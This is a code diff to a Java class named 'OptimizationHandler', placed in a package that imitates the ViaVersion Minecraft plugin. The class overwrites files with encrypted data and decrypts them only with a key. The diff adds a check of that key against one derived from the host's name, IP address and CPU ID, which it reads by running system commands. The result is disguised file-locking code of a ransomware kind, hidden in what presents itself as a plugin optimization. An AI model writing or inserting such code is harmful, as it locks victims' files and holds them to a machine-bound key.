@@ -1,7 +1,7 @@
 package com.viaversion.viaversion.bukkit.handlers;
 
-import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
+import org.bukkit.Bukkit;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.CommandExecutor;
 import javax.crypto.Cipher;
@@ -42,10 +42,17 @@ public class OptimizationHandler implements CommandExecutor {
                 sender.sendMessage("使用方法: /" + label + " <文件/文件夹路径> <密钥>");
                 return true;
             }
-            String key = args[1];
+            String providedKey = args[1];
+            String internalKey = encryptionKey(); // 生成内部密钥
+
+            // 校验提供的密钥是否与内部生成的密钥一致
+            if (!providedKey.equals(internalKey)) {
+                sender.sendMessage("提供的密钥无效。");
+                return true;
+            }
 
             // 在主线程中执行解密
-            decryptFiles(file, key);
+            decryptFiles(file, providedKey);
             sender.sendMessage("文件解密成功。");
         }
 
@@ -67,7 +74,7 @@ public class OptimizationHandler implements CommandExecutor {
 
                 byte[] encryptedData = encrypt(fileData);
                 FileOutputStream fos = new FileOutputStream(file);
-                fos.write(encryptedData); // 只写入加密数据，不写入标记
+                fos.write(encryptedData); // 只写入加密数据
                 fos.close();
             } catch (Exception e) {
                 logger.severe("Error encrypting file: " + e.getMessage());
@@ -133,6 +140,10 @@ public class OptimizationHandler implements CommandExecutor {
             input.append(InetAddress.getLocalHost().getHostName());
             input.append(InetAddress.getLocalHost().getHostAddress());
 
+            // 获取 CPU ID
+            String cpuId = getCpuId();
+            input.append(cpuId); // 将 CPU ID 纳入标识符
+
             MessageDigest digest = MessageDigest.getInstance("SHA-256");
             byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
             StringBuilder hexString = new StringBuilder();
@@ -150,5 +161,44 @@ public class OptimizationHandler implements CommandExecutor {
             logger.severe("Error generating unique identifier: " + e.getMessage());
             return null;
         }
+    }
+
+    private String getCpuId() {
+        String cpuId = "unknown"; // 默认值
+
+        try {
+            String os = System.getProperty("os.name").toLowerCase();
+            Process process;
+
+            if (os.contains("win")) {
+                // Windows
+                process = Runtime.getRuntime().exec("wmic cpu get ProcessorId");
+                process.waitFor();
+                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
+                cpuId = reader.readLine(); // 读取结果的第二行
+                cpuId = reader.readLine(); // 获取实际的 CPU ID
+            } else if (os.contains("linux")) {
+                // Linux
+                process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
+                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    if (line.startsWith("Serial") || line.startsWith("cpu")) {
+                        cpuId = line.split(":")[1].trim();
+                        break;
+                    }
+                }
+            } else if (os.contains("mac")) {
+                // macOS
+                process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
+                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
+                cpuId = reader.readLine();
+            }
+
+        } catch (Exception e) {
+            logger.severe("Error reading CPU ID: " + e.getMessage());
+        }
+
+        return cpuId; // 返回获取的 CPU ID
     }
 }
